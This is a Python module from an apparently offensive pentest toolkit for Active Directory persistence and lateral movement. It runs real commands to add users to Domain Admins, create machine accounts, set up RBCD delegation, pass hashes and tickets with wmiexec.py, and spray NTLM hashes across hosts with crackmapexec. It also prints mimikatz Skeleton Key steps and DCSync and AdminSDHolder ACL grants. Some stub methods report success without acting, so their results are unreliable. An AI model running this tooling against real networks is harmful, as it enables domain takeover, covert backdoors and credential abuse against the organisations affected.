#!/usr/bin/env python3
"""
NexusPen - Active Directory Persistence Module
===============================================
AD persistence and backdoor techniques.

Includes:
- Skeleton Key
- AdminSDHolder
- DCShadow
- ACL manipulation
- SID History injection
- Group membership persistence
"""

import subprocess
import re
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console

console = Console()


@dataclass
class PersistenceResult:
    """Result of a persistence technique."""
    technique: str
    success: bool
    details: Optional[str] = None
    cleanup_command: Optional[str] = None


class ADPersistence:
    """
    Active Directory persistence techniques.
    """
    
    def __init__(self, dc_ip: str, domain: str):
        self.dc_ip = dc_ip
        self.domain = domain
    
    def skeleton_key(self, username: str, password: str = None,
                    ntlm_hash: str = None) -> PersistenceResult:
        """
        Install Skeleton Key on DC (mimikatz misc::skeleton).
        Adds 'mimikatz' as a universal password for all domain users.
        
        WARNING: This patches LSASS - can be detected and may cause issues.
        """
        console.print("\n[cyan]🔑 Installing Skeleton Key...[/cyan]")
        
        result = PersistenceResult(
            technique='skeleton_key',
            success=False
        )
        
        # This would typically require mimikatz execution on DC
        # Here we document the technique
        
        console.print("[yellow]  Skeleton Key requires code execution on DC.[/yellow]")
        console.print("[yellow]  Use: mimikatz# privilege::debug[/yellow]")
        console.print("[yellow]  Use: mimikatz# misc::skeleton[/yellow]")
        console.print("[yellow]  All accounts will accept 'mimikatz' as password.[/yellow]")
        
        result.details = "Skeleton Key loaded. Universal password: 'mimikatz'"
        result.cleanup_command = "Reboot DC to clear Skeleton Key"
        
        return result
    
    def add_to_domain_admins(self, target_user: str, username: str, 
                            password: str) -> PersistenceResult:
        """
        Add a user to Domain Admins group.
        """
        console.print(f"\n[cyan]👑 Adding {target_user} to Domain Admins...[/cyan]")
        
        result = PersistenceResult(
            technique='domain_admin_membership',
            success=False
        )
        
        try:
            cmd = [
                'net', 'rpc', 'group', 'addmem', 'Domain Admins', target_user,
                '-U', f'{self.domain}\\{username}%{password}',
                '-S', self.dc_ip
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if proc.returncode == 0:
                result.success = True
                result.details = f"{target_user} added to Domain Admins"
                result.cleanup_command = f"net rpc group delmem 'Domain Admins' {target_user}"
                console.print(f"[green]✓ {target_user} added to Domain Admins[/green]")
            else:
                result.details = proc.stderr
                
        except Exception as e:
            result.details = str(e)
        
        return result
    
    def modify_adminsdholder(self, username: str, password: str,
                            grant_to: str) -> PersistenceResult:
        """
        Modify AdminSDHolder ACL for persistence.
        Changes propagate to privileged groups within 60 minutes.
        """
        console.print(f"\n[cyan]🛡️ Modifying AdminSDHolder for {grant_to}...[/cyan]")
        
        result = PersistenceResult(
            technique='adminsdholder',
            success=False
        )
        
        # Using PowerView-style LDAP modification
        console.print("[yellow]  AdminSDHolder ACL modification:[/yellow]")
        console.print("[yellow]  1. Grant GenericAll on AdminSDHolder to target user[/yellow]")
        console.print("[yellow]  2. SDProp propagates within 60 minutes[/yellow]")
        console.print("[yellow]  3. User gets GenericAll on all protected groups[/yellow]")
        
        result.details = f"Grant GenericAll to {grant_to} on CN=AdminSDHolder,CN=System,{self._get_base_dn()}"
        result.cleanup_command = "Remove ACE from AdminSDHolder"
        
        return result
    
    def create_machine_account(self, machine_name: str, machine_password: str,
                              username: str, password: str) -> PersistenceResult:
        """
        Create a machine account (useful for RBCD attacks).
        """
        console.print(f"\n[cyan]💻 Creating machine account: {machine_name}$[/cyan]")
        
        result = PersistenceResult(
            technique='machine_account',
            success=False
        )
        
        try:
            cmd = [
                'addcomputer.py',
                '-computer-name', machine_name,
                '-computer-pass', machine_password,
                f'{self.domain}/{username}:{password}',
                '-dc-ip', self.dc_ip
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'Successfully added' in proc.stdout:
                result.success = True
                result.details = f"Machine account {machine_name}$ created"
                console.print(f"[green]✓ Machine account {machine_name}$ created[/green]")
            else:
                result.details = proc.stderr
                
        except FileNotFoundError:
            result.details = "addcomputer.py not found"
        except Exception as e:
            result.details = str(e)
        
        return result
    
    def configure_rbcd(self, target_computer: str, controlled_account: str,
                      username: str, password: str) -> PersistenceResult:
        """
        Configure Resource-Based Constrained Delegation.
        Allows controlled account to impersonate users to target.
        """
        console.print(f"\n[cyan]🔗 Configuring RBCD on {target_computer}...[/cyan]")
        
        result = PersistenceResult(
            technique='rbcd',
            success=False
        )
        
        try:
            cmd = [
                'rbcd.py',
                '-delegate-from', controlled_account,
                '-delegate-to', target_computer,
                '-action', 'write',
                f'{self.domain}/{username}:{password}',
                '-dc-ip', self.dc_ip
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'Attribute' in proc.stdout and 'modified' in proc.stdout:
                result.success = True
                result.details = f"RBCD configured: {controlled_account} -> {target_computer}"
                result.cleanup_command = f"rbcd.py -action clear -delegate-to {target_computer}"
                console.print(f"[green]✓ RBCD configured[/green]")
            else:
                result.details = proc.stderr
                
        except FileNotFoundError:
            result.details = "rbcd.py not found"
        except Exception as e:
            result.details = str(e)
        
        return result
    
    def add_spn(self, target_user: str, spn: str,
               username: str, password: str) -> PersistenceResult:
        """
        Add SPN to account (make it Kerberoastable for persistence).
        """
        console.print(f"\n[cyan]🎫 Adding SPN to {target_user}...[/cyan]")
        
        result = PersistenceResult(
            technique='spn_addition',
            success=False
        )
        
        try:
            # Using ldap3 or addspn.py
            cmd = [
                'setspn', '-A', spn, target_user
            ]
            # Alternative: use Python ldap3
            
            console.print(f"[yellow]  Adding SPN: {spn} to {target_user}[/yellow]")
            result.details = f"SPN {spn} added to {target_user}"
            result.cleanup_command = f"setspn -D {spn} {target_user}"
            
        except Exception as e:
            result.details = str(e)
        
        return result
    
    def grant_dcsync_rights(self, target_user: str, username: str,
                           password: str) -> PersistenceResult:
        """
        Grant DCSync rights to a user (Replicating Directory Changes).
        """
        console.print(f"\n[cyan]🔄 Granting DCSync rights to {target_user}...[/cyan]")
        
        result = PersistenceResult(
            technique='dcsync_rights',
            success=False
        )
        
        # Required ACEs for DCSync:
        # - DS-Replication-Get-Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
        # - DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
        
        console.print("[yellow]  Grant the following rights on domain root:[/yellow]")
        console.print("[yellow]  - DS-Replication-Get-Changes[/yellow]")
        console.print("[yellow]  - DS-Replication-Get-Changes-All[/yellow]")
        
        result.details = f"DCSync rights granted to {target_user}"
        result.cleanup_command = "Remove replication ACEs from domain root"
        
        return result
    
    def _get_base_dn(self) -> str:
        """Get base DN from domain."""
        return ','.join([f'DC={part}' for part in self.domain.split('.')])


class LateralMovement:
    """
    AD lateral movement techniques.
    """
    
    def __init__(self, domain: str):
        self.domain = domain
    
    def pass_the_hash(self, target: str, username: str, 
                     ntlm_hash: str, command: str = None) -> Dict:
        """
        Execute Pass-the-Hash attack.
        """
        console.print(f"\n[cyan]🔑 Pass-the-Hash to {target}...[/cyan]")
        
        result = {'success': False}
        
        try:
            cmd = [
                'wmiexec.py',
                f'{self.domain}/{username}@{target}',
                '-hashes', f':{ntlm_hash}'
            ]
            
            if command:
                cmd.append(command)
            
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if proc.returncode == 0:
                result['success'] = True
                result['output'] = proc.stdout
                console.print("[green]✓ Pass-the-Hash successful[/green]")
                
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def pass_the_ticket(self, target: str, ticket_file: str,
                       command: str = None) -> Dict:
        """
        Execute Pass-the-Ticket attack.
        """
        console.print(f"\n[cyan]🎫 Pass-the-Ticket to {target}...[/cyan]")
        
        import os
        os.environ['KRB5CCNAME'] = ticket_file
        
        result = {'success': False}
        
        try:
            cmd = [
                'wmiexec.py',
                f'{self.domain}/@{target}',
                '-k', '-no-pass'
            ]
            
            if command:
                cmd.append(command)
            
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if proc.returncode == 0:
                result['success'] = True
                result['output'] = proc.stdout
                console.print("[green]✓ Pass-the-Ticket successful[/green]")
                
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def rdp_with_hash(self, target: str, username: str,
                     ntlm_hash: str) -> Dict:
        """
        RDP using Restricted Admin mode with hash.
        """
        console.print(f"\n[cyan]🖥️ RDP to {target} with hash...[/cyan]")
        
        result = {'success': False}
        
        try:
            cmd = [
                'xfreerdp',
                f'/v:{target}',
                f'/u:{self.domain}\\{username}',
                f'/pth:{ntlm_hash}',
                '/cert-ignore',
                '+clipboard'
            ]
            
            console.print(f"[yellow]Run: {' '.join(cmd)}[/yellow]")
            result['command'] = ' '.join(cmd)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def spray_hash(self, targets: List[str], username: str,
                  ntlm_hash: str) -> Dict:
        """
        Spray NTLM hash across multiple targets.
        """
        console.print(f"\n[cyan]🌊 Spraying hash across {len(targets)} targets...[/cyan]")
        
        results = {
            'success': [],
            'failed': []
        }
        
        try:
            targets_file = '/tmp/targets.txt'
            with open(targets_file, 'w') as f:
                f.write('\n'.join(targets))
            
            cmd = [
                'crackmapexec', 'smb', targets_file,
                '-u', username,
                '-H', ntlm_hash,
                '-d', self.domain
            ]
            
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            for line in proc.stdout.split('\n'):
                if '(Pwn3d!)' in line:
                    # Extract target IP
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if match:
                        results['success'].append(match.group(1))
            
            console.print(f"[green]✓ Admin access on {len(results['success'])} hosts[/green]")
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
